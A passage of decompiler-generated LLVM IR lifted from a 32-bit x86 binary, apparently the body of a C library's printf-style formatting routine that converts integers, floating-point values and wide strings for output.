  %v1_8050be0 = add i32 %v0_8050b58.lcssa, 7
  %v2_8050be0 = inttoptr i32 %v1_8050be0 to i8*
  store i8 32, i8* %v2_8050be0, align 1
  %v0_8050be5 = load i32, i32* @esp, align 4
  %v1_8050be5 = add i32 %v0_8050be5, 20
  %v2_8050be5 = inttoptr i32 %v1_8050be5 to i32*
  %v3_8050be5 = load i32, i32* %v2_8050be5, align 4
  %v5_8050be5 = icmp slt i32 %v3_8050be5, 0
  %v1_8050bea = icmp eq i1 %v5_8050be5, false
  br i1 %v1_8050bea, label %dec_label_pc_8050bf4, label %dec_label_pc_8050bec

dec_label_pc_8050bec:                             ; preds = %dec_label_pc_8050be0
  %v1_8050bec = add i32 %v0_8050be5, 36
  %v2_8050bec = inttoptr i32 %v1_8050bec to i8*
  %v3_8050bec = load i8, i8* %v2_8050bec, align 1
  %v4_8050bec = zext i8 %v3_8050bec to i32
  %v5_8050bec = load i32, i32* %edx.global-to-local, align 4
  %v6_8050bec = and i32 %v5_8050bec, -256
  %v7_8050bec = or i32 %v6_8050bec, %v4_8050bec
  store i32 %v7_8050bec, i32* %edx.global-to-local, align 4
  %v3_8050bf0 = add i32 %v0_8050be5, 7
  %v4_8050bf0 = inttoptr i32 %v3_8050bf0 to i8*
  store i8 %v3_8050bec, i8* %v4_8050bf0, align 1
  %v0_8050bf4.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050bf4

dec_label_pc_8050bf4:                             ; preds = %dec_label_pc_8050be0, %dec_label_pc_8050bec
  %v1_8050c0d = phi i32 [ %v0_8050be5, %dec_label_pc_8050be0 ], [ %v0_8050bf4.pre, %dec_label_pc_8050bec ]
  %v1_8050bf4 = add i32 %v1_8050c0d, 344
  %v2_8050bf4 = inttoptr i32 %v1_8050bf4 to i32*
  %v3_8050bf4 = load i32, i32* %v2_8050bf4, align 4
  store i32 %v3_8050bf4, i32* %eax.global-to-local, align 4
  store i32 1024, i32* %edx.global-to-local, align 4
  %v1_8050c00 = add i32 %v3_8050b58, -1
  %v8_8050c00 = icmp eq i32 %v1_8050c00, 0
  store i32 %v1_8050c00, i32* %ecx.global-to-local, align 4
  %v0_8050c0d.pre = load i32, i32* @edi, align 4
  br i1 %v8_8050c00, label %dec_label_pc_8050c0d, label %dec_label_pc_8050c03

dec_label_pc_8050c03:                             ; preds = %dec_label_pc_8050bf4
  %v2_8050c03 = mul i32 %v0_8050c0d.pre, 4
  %v3_8050c03 = add i32 %v1_8050c0d, 52
  %v4_8050c03 = add i32 %v3_8050c03, %v2_8050c03
  %v5_8050c03 = inttoptr i32 %v4_8050c03 to i32*
  %v6_8050c03 = load i32, i32* %v5_8050c03, align 4
  %v1_8050c07 = and i32 %v6_8050c03, 3840
  store i32 %v1_8050c07, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8050c0d

dec_label_pc_8050c0d:                             ; preds = %dec_label_pc_8050bf4, %dec_label_pc_8050c03
  %v2_8050c0d = add i32 %v1_8050c0d, -4
  %v3_8050c0d = inttoptr i32 %v2_8050c0d to i32*
  store i32 %v0_8050c0d.pre, i32* %v3_8050c0d, align 4
  %v0_8050c0e = load i32, i32* @esi, align 4
  %v2_8050c0e = add i32 %v1_8050c0d, -8
  %v3_8050c0e = inttoptr i32 %v2_8050c0e to i32*
  store i32 %v0_8050c0e, i32* %v3_8050c0e, align 4
  %v0_8050c0f = load i32, i32* %eax.global-to-local, align 4
  %v2_8050c0f = add i32 %v1_8050c0d, -12
  %v3_8050c0f = inttoptr i32 %v2_8050c0f to i32*
  store i32 %v0_8050c0f, i32* %v3_8050c0f, align 4
  %v0_8050c10 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050c10 = add i32 %v1_8050c0d, -16
  %v3_8050c10 = inttoptr i32 %v2_8050c10 to i32*
  store i32 %v0_8050c10, i32* %v3_8050c10, align 4
  %v0_8050c11 = call i32 @_load_inttype()
  %v0_8050c16 = load i32, i32* @ebx, align 4
  %v1_8050c16 = load i32, i32* @esp, align 4
  %v2_8050c16 = inttoptr i32 %v1_8050c16 to i32*
  store i32 %v0_8050c16, i32* %v2_8050c16, align 4
  %v0_8050c19 = load i32, i32* @esi, align 4
  %v1_8050c19 = load i32, i32* @esp, align 4
  %v2_8050c19 = add i32 %v1_8050c19, -4
  %v3_8050c19 = inttoptr i32 %v2_8050c19 to i32*
  store i32 %v0_8050c19, i32* %v3_8050c19, align 4
  %v0_8050c1a = load i32, i32* @edx, align 4
  %v2_8050c1a = add i32 %v1_8050c19, -8
  %v3_8050c1a = inttoptr i32 %v2_8050c1a to i32*
  store i32 %v0_8050c1a, i32* %v3_8050c1a, align 4
  %v2_8050c1b = add i32 %v1_8050c19, -12
  %v3_8050c1b = inttoptr i32 %v2_8050c1b to i32*
  store i32 %v0_8050c11, i32* %v3_8050c1b, align 4
  %v1_8050c1c = add i32 %v1_8050c19, 347
  store i32 %v1_8050c1c, i32* %eax.global-to-local, align 4
  %v2_8050c23 = add i32 %v1_8050c19, -16
  %v3_8050c23 = inttoptr i32 %v2_8050c23 to i32*
  store i32 %v1_8050c1c, i32* %v3_8050c23, align 4
  %v0_8050c24 = load i32, i32* %stack_var_-364, align 4
  %v5_8050c24 = inttoptr i32 %v0_8050c24 to i8*
  %v6_8050c24 = call i32 @_uintmaxtostr(i8* %v5_8050c24, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_8050c24, i32* %eax.global-to-local, align 4
  %v0_8050c29 = load i32, i32* @esp, align 4
  %v1_8050c29 = add i32 %v0_8050c29, 32
  store i32 %v6_8050c24, i32* @edi, align 4
  %v1_8050c2e = add i32 %v0_8050c29, 80
  %v2_8050c2e = inttoptr i32 %v1_8050c2e to i32*
  %v3_8050c2e = load i32, i32* %v2_8050c2e, align 4
  %tmp87 = icmp ult i32 %v3_8050c2e, 6
  br i1 %tmp87, label %dec_label_pc_8050c5c, label %dec_label_pc_8050c35

dec_label_pc_8050c35:                             ; preds = %dec_label_pc_8050c0d
  %v1_8050c35 = inttoptr i32 %v6_8050c24 to i8*
  %v2_8050c35 = load i8, i8* %v1_8050c35, align 1
  %v11_8050c35 = icmp eq i8 %v2_8050c35, 45
  %v1_8050c38 = icmp eq i1 %v11_8050c35, false
  %v1_8050c47 = add i32 %v0_8050c29, 64
  %v2_8050c47 = inttoptr i32 %v1_8050c47 to i32*
  %v3_8050c47 = load i32, i32* %v2_8050c47, align 4
  br i1 %v1_8050c38, label %dec_label_pc_8050c47, label %dec_label_pc_8050c3a

dec_label_pc_8050c3a:                             ; preds = %dec_label_pc_8050c35
  %v4_8050c3a = or i32 %v3_8050c47, 2
  store i32 %v4_8050c3a, i32* %v2_8050c47, align 4
  %v0_8050c3f = load i32, i32* @edi, align 4
  %v1_8050c3f = add i32 %v0_8050c3f, 1
  store i32 %v1_8050c3f, i32* @edi, align 4
  store i32 2, i32* @ebp, align 4
  %v0_8050c5c.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050c5c

dec_label_pc_8050c47:                             ; preds = %dec_label_pc_8050c35
  store i32 %v3_8050c47, i32* %eax.global-to-local, align 4
  %v2_8050c4b = and i32 %v3_8050c47, 2
  %v3_8050c4b = icmp eq i32 %v2_8050c4b, 0
  br i1 %v3_8050c4b, label %dec_label_pc_8050c53, label %dec_label_pc_8050c4f

dec_label_pc_8050c4f:                             ; preds = %dec_label_pc_8050c47
  store i32 0, i32* @ebp, align 4
  br label %dec_label_pc_8050c5c

dec_label_pc_8050c53:                             ; preds = %dec_label_pc_8050c47
  %v2_8050c53 = urem i32 %v3_8050c47, 2
  %v3_8050c53 = icmp eq i32 %v2_8050c53, 0
  br i1 %v3_8050c53, label %dec_label_pc_8050c5c, label %dec_label_pc_8050c57

dec_label_pc_8050c57:                             ; preds = %dec_label_pc_8050c53
  store i32 4, i32* @ebp, align 4
  br label %dec_label_pc_8050c5c

dec_label_pc_8050c5c:                             ; preds = %dec_label_pc_8050c53, %dec_label_pc_8050c0d, %dec_label_pc_8050c4f, %dec_label_pc_8050c3a, %dec_label_pc_8050c57
  %v0_8050caf = phi i32 [ %v6_8050c24, %dec_label_pc_8050c53 ], [ %v6_8050c24, %dec_label_pc_8050c0d ], [ %v6_8050c24, %dec_label_pc_8050c4f ], [ %v1_8050c3f, %dec_label_pc_8050c3a ], [ %v6_8050c24, %dec_label_pc_8050c57 ]
  %v0_8050cbe = phi i32 [ %v1_8050c29, %dec_label_pc_8050c53 ], [ %v1_8050c29, %dec_label_pc_8050c0d ], [ %v1_8050c29, %dec_label_pc_8050c4f ], [ %v0_8050c5c.pre, %dec_label_pc_8050c3a ], [ %v1_8050c29, %dec_label_pc_8050c57 ]
  %v1_8050c5c = add i32 %v0_8050cbe, 204
  store i32 %v1_8050c5c, i32* %ecx.global-to-local, align 4
  %v1_8050c63 = add i32 %v0_8050cbe, 20
  %v2_8050c63 = inttoptr i32 %v1_8050c63 to i32*
  %v3_8050c63 = load i32, i32* %v2_8050c63, align 4
  store i32 %v3_8050c63, i32* %edx.global-to-local, align 4
  %v2_8050c67 = sub i32 %v1_8050c5c, %v0_8050caf
  store i32 %v2_8050c67, i32* %ecx.global-to-local, align 4
  %v2_8050c69 = icmp slt i32 %v3_8050c63, 0
  %v1_8050c6b = add i32 %v2_8050c67, 127
  store i32 %v1_8050c6b, i32* @esi, align 4
  %v1_8050c6e = icmp eq i1 %v2_8050c69, false
  br i1 %v1_8050c6e, label %dec_label_pc_8050c75, label %dec_label_pc_8050c70

dec_label_pc_8050c70:                             ; preds = %dec_label_pc_8050c5c
  store i32 1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8050c75

dec_label_pc_8050c75:                             ; preds = %dec_label_pc_8050c5c, %dec_label_pc_8050c70
  %v0_8050c9b = phi i32 [ %v3_8050c63, %dec_label_pc_8050c5c ], [ 1, %dec_label_pc_8050c70 ]
  %v1_8050c75 = add i32 %v0_8050cbe, 32
  %v2_8050c75 = inttoptr i32 %v1_8050c75 to i8*
  %v3_8050c75 = load i8, i8* %v2_8050c75, align 1
  %v4_8050c75 = and i8 %v3_8050c75, 16
  %v5_8050c75 = icmp eq i8 %v4_8050c75, 0
  br i1 %v5_8050c75, label %dec_label_pc_8050caf, label %dec_label_pc_8050c7c

dec_label_pc_8050c7c:                             ; preds = %dec_label_pc_8050c75
  %v1_8050c7c = add i32 %v0_8050cbe, 48
  %v2_8050c7c = inttoptr i32 %v1_8050c7c to i32*
  %v3_8050c7c = load i32, i32* %v2_8050c7c, align 4
  store i32 %v3_8050c7c, i32* %eax.global-to-local, align 4
  %tmp88 = icmp ult i32 %v3_8050c7c, 3
  br i1 %tmp88, label %dec_label_pc_8050c85, label %dec_label_pc_8050c8a

dec_label_pc_8050c85:                             ; preds = %dec_label_pc_8050c7c
  store i32 6, i32* @ebp, align 4
  br label %dec_label_pc_8050c8a

dec_label_pc_8050c8a:                             ; preds = %dec_label_pc_8050c7c, %dec_label_pc_8050c85
  %v9_8050c8a = icmp eq i32 %v3_8050c7c, 3
  %v1_8050c8d = icmp eq i1 %v9_8050c8a, false
  br i1 %v1_8050c8d, label %dec_label_pc_8050c96, label %dec_label_pc_8050c8f

dec_label_pc_8050c8f:                             ; preds = %dec_label_pc_8050c8a
  store i32 9, i32* @ebp, align 4
  br label %dec_label_pc_8050caf

dec_label_pc_8050c96:                             ; preds = %dec_label_pc_8050c8a
  %v9_8050c96 = icmp eq i32 %v3_8050c7c, 4
  %v1_8050c99 = icmp eq i1 %v9_8050c96, false
  br i1 %v1_8050c99, label %dec_label_pc_8050caf, label %dec_label_pc_8050c9b

dec_label_pc_8050c9b:                             ; preds = %dec_label_pc_8050c96
  %tmp = icmp ugt i32 %v0_8050c9b, %v1_8050c6b
  br i1 %tmp, label %dec_label_pc_8050caf, label %dec_label_pc_8050c9f

dec_label_pc_8050c9f:                             ; preds = %dec_label_pc_8050c9b
  store i32 1, i32* %edx.global-to-local, align 4
  %v1_8050ca4 = inttoptr i32 %v0_8050caf to i8*
  %v2_8050ca4 = load i8, i8* %v1_8050ca4, align 1
  %v8_8050ca4 = icmp eq i8 %v2_8050ca4, 48
  br i1 %v8_8050ca4, label %dec_label_pc_8050caf, label %dec_label_pc_8050ca9

dec_label_pc_8050ca9:                             ; preds = %dec_label_pc_8050c9f
  %v1_8050ca9 = add i32 %v2_8050c67, 128
  store i32 %v1_8050ca9, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8050caf

dec_label_pc_8050caf:                             ; preds = %dec_label_pc_8050c9b, %dec_label_pc_8050c9f, %dec_label_pc_8050c96, %dec_label_pc_8050c75, %dec_label_pc_8050c8f, %dec_label_pc_8050ca9
  %v0_8050ce7 = phi i32 [ %v0_8050c9b, %dec_label_pc_8050c9b ], [ 1, %dec_label_pc_8050c9f ], [ %v0_8050c9b, %dec_label_pc_8050c96 ], [ %v0_8050c9b, %dec_label_pc_8050c75 ], [ %v0_8050c9b, %dec_label_pc_8050c8f ], [ %v1_8050ca9, %dec_label_pc_8050ca9 ]
  %v1_8050caf = inttoptr i32 %v0_8050caf to i8*
  %v2_8050caf = load i8, i8* %v1_8050caf, align 1
  %v8_8050caf = icmp eq i8 %v2_8050caf, 48
  %v1_8050cb2 = icmp eq i1 %v8_8050caf, false
  br i1 %v1_8050cb2, label %dec_label_pc_8050cdf, label %dec_label_pc_8050cb4

dec_label_pc_8050cb4:                             ; preds = %dec_label_pc_8050caf
  %v0_8050cb4 = load i32, i32* @ebp, align 4
  %v7_8050cb7 = icmp sgt i32 %v0_8050cb4, 5
  br i1 %v7_8050cb7, label %dec_label_pc_8050cb9, label %dec_label_pc_8050cbe

dec_label_pc_8050cb9:                             ; preds = %dec_label_pc_8050cb4
  store i32 11, i32* @ebp, align 4
  br label %dec_label_pc_8050cbe

dec_label_pc_8050cbe:                             ; preds = %dec_label_pc_8050cb4, %dec_label_pc_8050cb9
  %v1_8050cbe = add i32 %v0_8050cbe, 48
  %v2_8050cbe = inttoptr i32 %v1_8050cbe to i32*
  %v3_8050cbe = load i32, i32* %v2_8050cbe, align 4
  %v12_8050cbe = icmp eq i32 %v3_8050cbe, 1
  %v1_8050cc3 = icmp eq i1 %v12_8050cbe, false
  br i1 %v1_8050cc3, label %dec_label_pc_8050cd4, label %dec_label_pc_8050cc5

dec_label_pc_8050cc5:                             ; preds = %dec_label_pc_8050cbe
  store i32 ptrtoint ([6 x i8]* @global_var_805b524.215 to i32), i32* @edi, align 4
  store i32 5, i32* @esi, align 4
  br label %dec_label_pc_8050e50

dec_label_pc_8050cd4:                             ; preds = %dec_label_pc_8050cbe
  %v1_8050cd4 = icmp eq i32 %v0_8050ce7, 0
  %v1_8050cd6 = icmp eq i1 %v1_8050cd4, false
  br i1 %v1_8050cd6, label %dec_label_pc_8050cdf, label %dec_label_pc_8050cd8

dec_label_pc_8050cd8:                             ; preds = %dec_label_pc_8050cd4
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_8050e50

dec_label_pc_8050cdf:                             ; preds = %dec_label_pc_8050cd4, %dec_label_pc_8050caf
  %v2_8050cdf = sub i32 %v0_8050ce7, %v1_8050c6b
  %v7_8050cdf = icmp ult i32 %v0_8050ce7, %v1_8050c6b
  %v12_8050cdf = icmp eq i32 %v2_8050cdf, 0
  %v2_8050ce1 = or i1 %v7_8050cdf, %v12_8050cdf
  br i1 %v2_8050ce1, label %dec_label_pc_8050e50, label %dec_label_pc_8050ce7

dec_label_pc_8050ce7:                             ; preds = %dec_label_pc_8050cdf
  store i32 %v2_8050cdf, i32* @ebx, align 4
  br label %dec_label_pc_8050e6a

dec_label_pc_8050cf0:                             ; preds = %dec_label_pc_8050b86
  %tmp89 = icmp ult i32 %v3_8050b58, 16
  br i1 %tmp89, label %dec_label_pc_8050cf5, label %dec_label_pc_8050d3a

dec_label_pc_8050cf5:                             ; preds = %dec_label_pc_8050cf0
  %v1_8050cf5 = add i32 %v0_8050b58.lcssa, 33
  %v2_8050cf5 = inttoptr i32 %v1_8050cf5 to i8*
  %v3_8050cf5 = load i8, i8* %v2_8050cf5, align 1
  %v4_8050cf5 = and i8 %v3_8050cf5, 8
  %v5_8050cf5 = icmp eq i8 %v4_8050cf5, 0
  %v1_8050cfa = add i32 %v0_8050b58.lcssa, 344
  %v2_8050cfa = inttoptr i32 %v1_8050cfa to i32*
  %v3_8050cfa = load i32, i32* %v2_8050cfa, align 4
  store i32 %v3_8050cfa, i32* %edx.global-to-local, align 4
  br i1 %v5_8050cf5, label %dec_label_pc_8050d07, label %dec_label_pc_8050d03

dec_label_pc_8050d03:                             ; preds = %dec_label_pc_8050cf5
  %v1_8050d03 = inttoptr i32 %v3_8050cfa to x86_fp80*
  %v2_8050d03 = load x86_fp80, x86_fp80* %v1_8050d03, align 4
  br label %dec_label_pc_8050d09

dec_label_pc_8050d07:                             ; preds = %dec_label_pc_8050cf5
  %v1_8050d07 = inttoptr i32 %v3_8050cfa to double*
  %v2_8050d07 = load double, double* %v1_8050d07, align 4
  %v3_8050d07 = fpext double %v2_8050d07 to x86_fp80
  br label %dec_label_pc_8050d09

dec_label_pc_8050d09:                             ; preds = %dec_label_pc_8050d03, %dec_label_pc_8050d07
  %storemerge4 = phi x86_fp80 [ %v2_8050d03, %dec_label_pc_8050d03 ], [ %v3_8050d07, %dec_label_pc_8050d07 ]
  store x86_fp80 %storemerge4, x86_fp80* %st0.global-to-local, align 4
  %v0_8050d09 = load i32, i32* @esi, align 4
  %v2_8050d09 = add i32 %v0_8050b58.lcssa, -4
  %v3_8050d09 = inttoptr i32 %v2_8050d09 to i32*
  store i32 %v0_8050d09, i32* %v3_8050d09, align 4
  %v0_8050d0a = load i32, i32* @esi, align 4
  %v2_8050d0a = add i32 %v0_8050b58.lcssa, -8
  %v3_8050d0a = inttoptr i32 %v2_8050d0a to i32*
  store i32 %v0_8050d0a, i32* %v3_8050d0a, align 4
  %v1_8050d0b = add i32 %v0_8050b58.lcssa, -12
  %v2_8050d0b = inttoptr i32 %v1_8050d0b to i32*
  store i32 134547918, i32* %v2_8050d0b, align 4
  %v1_8050d10 = add i32 %v0_8050b58.lcssa, 20
  store i32 %v1_8050d10, i32* %eax.global-to-local, align 4
  %v2_8050d14 = add i32 %v0_8050b58.lcssa, -16
  %v3_8050d14 = inttoptr i32 %v2_8050d14 to i32*
  store i32 %v1_8050d10, i32* %v3_8050d14, align 4
  %v1_8050d15 = add i32 %v0_8050b58.lcssa, -28
  %v1_8050d18 = load x86_fp80, x86_fp80* %st0.global-to-local, align 4
  %v3_8050d18 = inttoptr i32 %v1_8050d15 to x86_fp80*
  store x86_fp80 %v1_8050d18, x86_fp80* %v3_8050d18, align 4
  %v1_8050d1b = add i32 %v0_8050b58.lcssa, 368
  %v2_8050d1b = inttoptr i32 %v1_8050d1b to i32*
  %v3_8050d1b = load i32, i32* %v2_8050d1b, align 4
  %v5_8050d1b = add i32 %v0_8050b58.lcssa, -32
  %v6_8050d1b = inttoptr i32 %v5_8050d1b to i32*
  store i32 %v3_8050d1b, i32* %v6_8050d1b, align 4
  %v0_8050d22 = call i32 @_fpmaxtostr()
  store i32 %v0_8050d22, i32* %eax.global-to-local, align 4
  %v0_8050d27 = load i32, i32* @esp, align 4
  %v1_8050d27 = add i32 %v0_8050d27, 32
  %v2_8050d2a = icmp slt i32 %v0_8050d22, 0
  br i1 %v2_8050d2a, label %dec_label_pc_8050fcb, label %dec_label_pc_8050d32

dec_label_pc_8050d32:                             ; preds = %dec_label_pc_8050d09
  %v1_8050d32 = inttoptr i32 %v1_8050d27 to i32*
  %v2_8050d32 = load i32, i32* %v1_8050d32, align 4
  %v4_8050d32 = add i32 %v2_8050d32, %v0_8050d22
  store i32 %v4_8050d32, i32* %v1_8050d32, align 4
  %v0_8050fb8.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8050fb8

dec_label_pc_8050d3a:                             ; preds = %dec_label_pc_8050cf0
  %tmp90 = or i32 %v3_8050b58, 1
  %tmp91 = icmp eq i32 %tmp90, 17
  br i1 %tmp91, label %dec_label_pc_8050d43, label %dec_label_pc_8050dd6

dec_label_pc_8050d43:                             ; preds = %dec_label_pc_8050d3a
  %v9_8050d3a = icmp eq i32 %v3_8050b58, 17
  %v1_8050d43 = add i32 %v0_8050b58.lcssa, 332
  %v2_8050d43 = inttoptr i32 %v1_8050d43 to i32*
  store i32 0, i32* %v2_8050d43, align 4
  %v0_8050d4e = load i32, i32* @esp, align 4
  %v1_8050d4e = add i32 %v0_8050d4e, 344
  %v2_8050d4e = inttoptr i32 %v1_8050d4e to i32*
  %v3_8050d4e = load i32, i32* %v2_8050d4e, align 4
  store i32 %v3_8050d4e, i32* %edx.global-to-local, align 4
  %v1_8050d55 = icmp eq i1 %v9_8050d3a, false
  br i1 %v1_8050d55, label %dec_label_pc_8050da1, label %dec_label_pc_8050d57

dec_label_pc_8050d57:                             ; preds = %dec_label_pc_8050d43
  %v1_8050d57 = inttoptr i32 %v3_8050d4e to i32*
  %v2_8050d57 = load i32, i32* %v1_8050d57, align 4
  store i32 %v2_8050d57, i32* %eax.global-to-local, align 4
  %v2_8050d59 = add i32 %v0_8050d4e, 340
  %v3_8050d59 = inttoptr i32 %v2_8050d59 to i32*
  store i32 %v2_8050d57, i32* %v3_8050d59, align 4
  %v0_8050d60 = load i32, i32* %eax.global-to-local, align 4
  %v1_8050d60 = icmp eq i32 %v0_8050d60, 0
  br i1 %v1_8050d60, label %dec_label_pc_8050e54, label %dec_label_pc_8050d68

dec_label_pc_8050d68:                             ; preds = %dec_label_pc_8050d57
  %v0_8050d68 = load i32, i32* @esp, align 4
  %v1_8050d68 = add i32 %v0_8050d68, 20
  %v2_8050d68 = inttoptr i32 %v1_8050d68 to i32*
  %v3_8050d68 = load i32, i32* %v2_8050d68, align 4
  store i32 %v3_8050d68, i32* %eax.global-to-local, align 4
  %v2_8050d6f = icmp slt i32 %v3_8050d68, 0
  br i1 %v2_8050d6f, label %dec_label_pc_8050d75, label %dec_label_pc_8050d73

dec_label_pc_8050d73:                             ; preds = %dec_label_pc_8050d68
  br label %dec_label_pc_8050d75

dec_label_pc_8050d75:                             ; preds = %dec_label_pc_8050d68, %dec_label_pc_8050d73
  %storemerge95 = phi i32 [ %v3_8050d68, %dec_label_pc_8050d73 ], [ -1, %dec_label_pc_8050d68 ]
  store i32 %storemerge95, i32* %ecx.global-to-local, align 4
  %v1_8050d75 = add i32 %v0_8050d68, 340
  store i32 %v1_8050d75, i32* %edx.global-to-local, align 4
  %v1_8050d7c = add i32 %v0_8050d68, 332
  store i32 %v1_8050d7c, i32* %eax.global-to-local, align 4
  %v2_8050d83 = add i32 %v0_8050d68, -4
  %v3_8050d83 = inttoptr i32 %v2_8050d83 to i32*
  store i32 %v1_8050d7c, i32* %v3_8050d83, align 4
  %v0_8050d84 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8050d84 = add i32 %v0_8050d68, -8
  %v3_8050d84 = inttoptr i32 %v2_8050d84 to i32*
  store i32 %v0_8050d84, i32* %v3_8050d84, align 4
  %v0_8050d85 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050d85 = add i32 %v0_8050d68, -12
  %v3_8050d85 = inttoptr i32 %v2_8050d85 to i32*
  store i32 %v0_8050d85, i32* %v3_8050d85, align 4
  %v0_8050d86 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050d86 = add i32 %v0_8050d68, -16
  %v3_8050d86 = inttoptr i32 %v2_8050d86 to i32*
  store i32 %v0_8050d86, i32* %v3_8050d86, align 4
  %v0_8050d87 = call i32 @__GI_wcsrtombs()
  store i32 %v0_8050d87, i32* %eax.global-to-local, align 4
  %v0_8050d8c = load i32, i32* @esp, align 4
  %v1_8050d8c = add i32 %v0_8050d8c, 16
  store i32 %v0_8050d87, i32* @esi, align 4
  %v10_8050d91 = icmp eq i32 %v0_8050d87, -1
  br i1 %v10_8050d91, label %dec_label_pc_8050fcb, label %dec_label_pc_8050d9a

dec_label_pc_8050d9a:                             ; preds = %dec_label_pc_8050d75
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_8050e5e

dec_label_pc_8050da1:                             ; preds = %dec_label_pc_8050d43
  %v0_8050da1 = load i32, i32* @ebx, align 4
  %v2_8050da1 = add i32 %v0_8050d4e, -4
  %v3_8050da1 = inttoptr i32 %v2_8050da1 to i32*
  store i32 %v0_8050da1, i32* %v3_8050da1, align 4
  %v1_8050da2 = add i32 %v0_8050d4e, 332
  store i32 %v1_8050da2, i32* %eax.global-to-local, align 4
  %v2_8050da9 = add i32 %v0_8050d4e, -8
  %v3_8050da9 = inttoptr i32 %v2_8050da9 to i32*
  store i32 %v1_8050da2, i32* %v3_8050da9, align 4
  %v0_8050daa = load i32, i32* %edx.global-to-local, align 4
  %v1_8050daa = inttoptr i32 %v0_8050daa to i32*
  %v2_8050daa = load i32, i32* %v1_8050daa, align 4
  %v4_8050daa = add i32 %v0_8050d4e, -12
  %v5_8050daa = inttoptr i32 %v4_8050daa to i32*
  store i32 %v2_8050daa, i32* %v5_8050daa, align 4
  %v1_8050dac = add i32 %v0_8050d4e, 204
  store i32 %v1_8050dac, i32* @ebx, align 4
  %v2_8050db3 = add i32 %v0_8050d4e, -16
  %v3_8050db3 = inttoptr i32 %v2_8050db3 to i32*
  store i32 %v1_8050dac, i32* %v3_8050db3, align 4
  %v0_8050db4 = call i32 @__GI_wcrtomb()
  store i32 %v0_8050db4, i32* %eax.global-to-local, align 4
  %v0_8050db9 = load i32, i32* @esp, align 4
  %v1_8050db9 = add i32 %v0_8050db9, 16
  store i32 %v0_8050db4, i32* @esi, align 4
  %v10_8050dbe = icmp eq i32 %v0_8050db4, -1
  br i1 %v10_8050dbe, label %dec_label_pc_8050fcb, label %dec_label_pc_8050dc7

dec_label_pc_8050dc7:                             ; preds = %dec_label_pc_8050da1
  %v0_8050dc7 = load i32, i32* @ebx, align 4
  store i32 %v0_8050dc7, i32* @edi, align 4
  %v2_8050dc9 = add i32 %v0_8050db4, 220
  %v3_8050dc9 = add i32 %v2_8050dc9, %v0_8050db9
  %v4_8050dc9 = inttoptr i32 %v3_8050dc9 to i8*
  store i8 0, i8* %v4_8050dc9, align 1
  br label %dec_label_pc_8050e5e

dec_label_pc_8050dd6:                             ; preds = %dec_label_pc_8050d3a
  %tmp92 = icmp ult i32 %v3_8050b58, 20
  br i1 %tmp92, label %dec_label_pc_8050ddb, label %dec_label_pc_8050e26

dec_label_pc_8050ddb:                             ; preds = %dec_label_pc_8050dd6
  %v9_8050dd6 = icmp eq i32 %v3_8050b58, 19
  %v1_8050ddb = add i32 %v0_8050b58.lcssa, 344
  %v2_8050ddb = inttoptr i32 %v1_8050ddb to i32*
  %v3_8050ddb = load i32, i32* %v2_8050ddb, align 4
  store i32 %v3_8050ddb, i32* %edx.global-to-local, align 4
  %v1_8050de2 = icmp eq i1 %v9_8050dd6, false
  %v1_8050e07 = inttoptr i32 %v3_8050ddb to i32*
  %v2_8050e07 = load i32, i32* %v1_8050e07, align 4
  br i1 %v1_8050de2, label %dec_label_pc_8050e07, label %dec_label_pc_8050de4

dec_label_pc_8050de4:                             ; preds = %dec_label_pc_8050ddb
  store i32 %v2_8050e07, i32* @edi, align 4
  %v1_8050de6 = icmp eq i32 %v2_8050e07, 0
  br i1 %v1_8050de6, label %dec_label_pc_8050e54, label %dec_label_pc_8050dea

dec_label_pc_8050dea:                             ; preds = %dec_label_pc_8050de4, %dec_label_pc_8050e2f
  %v1_8050df7 = phi i32 [ %v0_8050b58.lcssa, %dec_label_pc_8050de4 ], [ %v1_8050e49, %dec_label_pc_8050e2f ]
  %v1_8050dea = add i32 %v1_8050df7, 20
  %v2_8050dea = inttoptr i32 %v1_8050dea to i32*
  %v3_8050dea = load i32, i32* %v2_8050dea, align 4
  store i32 %v3_8050dea, i32* %eax.global-to-local, align 4
  %v2_8050df1 = icmp slt i32 %v3_8050dea, 0
  br i1 %v2_8050df1, label %dec_label_pc_8050df7, label %dec_label_pc_8050df5

dec_label_pc_8050df5:                             ; preds = %dec_label_pc_8050dea
  br label %dec_label_pc_8050df7

dec_label_pc_8050df7:                             ; preds = %dec_label_pc_8050dea, %dec_label_pc_8050df5
  %storemerge = phi i32 [ %v3_8050dea, %dec_label_pc_8050df5 ], [ -1, %dec_label_pc_8050dea ]
  store i32 %storemerge, i32* %edx.global-to-local, align 4
  %v2_8050df7 = add i32 %v1_8050df7, -4
  %v3_8050df7 = inttoptr i32 %v2_8050df7 to i32*
  store i32 %v3_8050b58, i32* %v3_8050df7, align 4
  %v2_8050df8 = add i32 %v1_8050df7, -8
  %v3_8050df8 = inttoptr i32 %v2_8050df8 to i32*
  store i32 %v3_8050b58, i32* %v3_8050df8, align 4
  %v0_8050df9 = load i32, i32* %edx.global-to-local, align 4
  %v2_8050df9 = add i32 %v1_8050df7, -12
  %v3_8050df9 = inttoptr i32 %v2_8050df9 to i32*
  store i32 %v0_8050df9, i32* %v3_8050df9, align 4
  %v0_8050dfa = load i32, i32* @edi, align 4
  %v2_8050dfa = add i32 %v1_8050df7, -16
  %v3_8050dfa = inttoptr i32 %v2_8050dfa to i32*
  store i32 %v0_8050dfa, i32* %v3_8050dfa, align 4
  %v0_8050dfb = call i32 @strnlen()
  store i32 %v0_8050dfb, i32* %eax.global-to-local, align 4
  store i32 %v0_8050dfb, i32* @esi, align 4
  br label %dec_label_pc_8050e5e

dec_label_pc_8050e07:                             ; preds = %dec_label_pc_8050ddb
  store i32 %v2_8050e07, i32* %eax.global-to-local, align 4
  %v1_8050e09 = add i32 %v0_8050b58.lcssa, 204
  store i32 %v1_8050e09, i32* @edi, align 4
